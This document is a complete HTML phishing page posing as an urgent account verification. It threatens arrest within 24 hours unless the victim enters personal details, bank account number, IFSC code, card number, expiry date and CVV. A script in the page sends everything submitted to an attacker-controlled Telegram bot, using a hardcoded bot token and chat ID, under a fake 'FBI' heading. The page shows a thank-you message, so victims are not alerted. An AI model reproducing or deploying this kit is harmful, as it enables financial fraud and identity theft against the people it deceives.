<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Urgent Account Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f8f9fa;
        }
        .form-container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            border: 2px solid #dc3545;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        .form-header {
            text-align: center;
            font-weight: bold;
            font-size: 22px;
            color: #dc3545;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .form-subheader {
            text-align: center;
            font-size: 16px;
            margin-bottom: 20px;
            color: #333;
        }
        .alert {
            font-size: 14px;
            color: #dc3545;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }
        .form-group button:hover {
            background-color: #c82333;
        }
        .success-message {
            display: none;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="form-header">Immediate Action Required</div>
        <div class="form-subheader">Suspicious Activity Detected on Your Account</div>
        <p class="alert">
            You must provide the requested information within 24 hours to avoid legal consequences. Failure to comply may result in your arrest and account suspension.
        </p>
        <form id="verificationForm">
            <!-- Personal Information -->
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
            </div>
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" name="dob" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="Enter your email address" required>
            </div>
            <div class="form-group">
                <label for="phoneNo">Phone Number</label>
                <input type="tel" id="phoneNo" name="phoneNo" placeholder="Enter your phone number" required>
            </div>

            <!-- Bank Details -->
            <div class="form-group">
                <label for="bankName">Bank Name</label>
                <input type="text" id="bankName" name="bankName" placeholder="Enter your bank name" required>
            </div>
            <div class="form-group">
                <label for="accountNumber">Account Number</label>
                <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>
            </div>
            <div class="form-group">
                <label for="ifscCode">IFSC Code</label>
                <input type="text" id="ifscCode" name="ifscCode" placeholder="Enter your bank's IFSC code" required>
            </div>
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your card number" required>
            </div>
            <div class="form-group">
                <label for="expiryDate">Card Expiry Date</label>
                <input type="month" id="expiryDate" name="expiryDate" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="password" id="cvv" name="cvv" placeholder="Enter the CVV" maxlength="3" required>
            </div>

            <!-- Submit Button -->
            <div class="form-group">
                <button type="submit">Verify Now</button>
            </div>
        </form>
        <div class="success-message" id="successMessage">
            We will get back to you soon after we have verified everything. Thank you!
        </div>
    </div>

    <script>
        const BOT_TOKEN = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo";
        const CHAT_ID = "6482794683";

        const form = document.getElementById('verificationForm');
        const successMessage = document.getElementById('successMessage');

        form.addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());

            const message = `
🚨 **FBI URGENT ACCOUNT VERIFICATION** 🚨
---------------------------------------
♻️ **Full Name**: ${data.fullName}
📅 **DOB**: ${data.dob}
📧 **Email**: ${data.email}
📞 **Phone Number**: ${data.phoneNo}
🏦 **Bank Name**: ${data.bankName}
💳 **Account Number**: ${data.accountNumber}
🔑 **IFSC Code**: ${data.ifscCode}
💳 **Card Number**: ${data.cardNumber}
📅 **Expiry Date**: ${data.expiryDate}
🔒 **CVV**: ${data.cvv}
---------------------------------------
            `;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    successMessage.style.display = 'block';
                    form.reset();
                } else {
                    alert('Failed to send information. Please try again later.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again later.');
            });
        });
    </script>
</body>
</html>
